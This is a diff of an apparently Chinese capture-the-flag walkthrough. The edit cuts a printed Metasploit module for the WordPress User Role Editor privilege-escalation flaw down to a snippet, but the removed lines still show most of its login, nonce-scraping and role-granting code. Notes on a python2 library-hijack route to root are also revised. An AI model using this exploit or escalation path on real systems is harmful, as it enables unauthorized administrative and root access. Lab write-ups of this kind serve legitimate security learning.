@@ -67,50 +67,13 @@ searchsploit WordPress Privilege Escalation
 ![searchsploit搜索可利用exp](./assets/image-20250212155617767.png)
 
 ```bash
-# 利用代码如下
+# 利用代码片段如下
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::HTTP::Wordpress
-
-  def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress User Role Editor Plugin Privilege Escalation',
-      'Description'     => %q{
-        The WordPress User Role Editor plugin prior to v4.25, is lacking an authorization
-        check within its update user profile functionality ("update" function, contained
-        within the "class-user-other-roles.php" module).
-        Instead of verifying whether the current user has the right to edit other users'
-        profiles ("edit_users" WP capability), the vulnerable function verifies whether the
-        current user has the rights to edit the user ("edit_user" WP function) specified by
-        the supplied user id ("user_id" variable/HTTP POST parameter). Since the supplied
-        user id is the current user's id, this check is always bypassed (i.e. the current
-        user is always allowed to modify its profile).
-        This vulnerability allows an authenticated user to add arbitrary User Role Editor
-        roles to its profile, by specifying them via the "ure_other_roles" parameter within
-        the HTTP POST request to the "profile.php" module (issued when "Update Profile" is
-        clicked).
-        By default, this module grants the specified WP user all administrative privileges,
-        existing within the context of the User Role Editor plugin.
-      },
-      'Author'          =>
-        [
-          'ethicalhack3r',    # Vulnerability discovery
-          'Tomislav Paskalev' # Exploit development, metasploit module
-        ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
-          ['WPVDB', '8432'],
-          ['URL', 'https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/']
-	],
-      'DisclosureDate'  => 'Apr 05 2016',
-    ))
-
+......
     register_options(
       [
         OptString.new('TARGETURI',   [true, 'URI path to WordPress', '/']),
@@ -124,84 +87,7 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
-  # Detect the vulnerable plugin by enumerating its readme.txt file
-  def check
-    readmes = ['readme.txt', 'Readme.txt', 'README.txt']
-
-    res = nil
-    readmes.each do |readme_name|
-      readme_url = normalize_uri(target_uri.path, datastore['CONTENTPATH'], datastore['PLUGINSPATH'], datastore['PLUGINPATH'], readme_name)
-      vprint_status("Checking #{readme_url}")
-      res = send_request_cgi(
-        'uri'    => readme_url,
-        'method' => 'GET'
-      )
-      break if res && res.code == 200
-    end
-
-    if res.nil? || res.code != 200
-      # The readme.txt file does not exist
-      return Msf::Exploit::CheckCode::Unknown
-    end
-
-    version_res = extract_and_check_version(res.body.to_s, :readme, 'plugin', '4.25', nil)
-    return version_res
-  end
-
-  def username
-    datastore['USERNAME']
-  end
-
-  def password
-    datastore['PASSWORD']
-  end
-
-  # Search for specified data within the provided HTTP response
-  def check_response(res, name, regex)
-    res.body =~ regex
-    result = $1
-    if result
-      print_good("#{peer} - WordPress - Getting data   - #{name}")
-    else
-      vprint_error("#{peer} #{res.body}")
-      fail_with("#{peer} - WordPress - Getting data   - Failed (#{name})")
-    end
-    return result
-  end
-
-  # Run the exploit
-  def run
-    # Check if the specified target is running WordPress
-    fail_with("#{peer} - WordPress - Not Found") unless wordpress_and_online?
-
-    # Authenticate to WordPress
-    print_status("#{peer} - WordPress - Authentication - #{username}:#{password}")
-    cookie = wordpress_login(username, password)
-    fail_with("#{peer} - WordPress - Authentication - Failed") if cookie.nil?
-    store_valid_credential(user: username, private: password, proof: cookie)
-    print_good("#{peer} - WordPress - Authentication - OK")
-
-    # Get additional information from WordPress, required for the HTTP POST request (anti-CSRF tokens, user parameters)
-    url = normalize_uri(wordpress_url_backend, 'profile.php')
-    print_status("#{peer} - WordPress - Getting data   - #{url}")
-    res = send_request_cgi({
-      'method'   => 'GET',
-      'uri'      => url,
-      'cookie'   => cookie
-    })
-
-    if res and res.code == 200
-      wp_nonce     = check_response(res, "_wpnonce",     /name=\"_wpnonce\" value=\"(.+?(?=\"))\"/)
-      color_nonce  = check_response(res, "color-nonce",  /name=\"color-nonce\" value=\"(.+?(?=\"))\"/)
-      checkuser_id = check_response(res, "checkuser_id", /name=\"checkuser_id\" value=\"(.+?(?=\"))\"/)
-      nickname     = check_response(res, "nickname",     /name=\"nickname\" id=\"nickname\" value=\"(.+?(?=\"))\"/)
-      display_name = check_response(res, "display_name", /name=\"display_name\" id=\"display_name\"\>[\s]+\<option  selected=\'selected\'\>(.+?(?=\<))\</)
-      email        = check_response(res, "email",        /name=\"email\" id=\"email\" value=\"(.+?(?=\"))\"/)
-      user_id      = check_response(res, "user_id",      /name=\"user_id\" id=\"user_id\" value=\"(.+?(?=\"))\"/)
-    else
-      fail_with("#{peer} - WordPress - Getting data   - Server response (code #{res.code})")
-    end
- 
+ ......
     # Send HTTP POST request - update the specified user's privileges
     print_status("#{peer} - WordPress - Changing privs - #{username}")
     res = send_request_cgi({
@@ -299,7 +185,7 @@ chmod u+x pspy64
 ./pspy64
 ```
 
-发现到一个python脚本
+发现到一个python脚本,经查询其默认调用的是python2
 
 ![pspy的部分输出](./assets/image-20250212170123250.png)
 
@@ -309,7 +195,7 @@ chmod u+x pspy64
 
 ## Root提权
 
-通过代码可以发现,`os.system`是`python2`的语法,功能是调用`curl`将请求127.0.0.1的请求头保存到日志文件中,目的大概是为了服务可用性记录.文件仅root可写
+通过代码可以发现脚本功能是调用`curl`将请求127.0.0.1的请求头保存到日志文件中,目的大概是为了服务可用性记录.文件仅root可写
 
 检查了curl和python2,并没有什么异常,但是在检查python2的库文件时发现库文件都属于`family`组
 
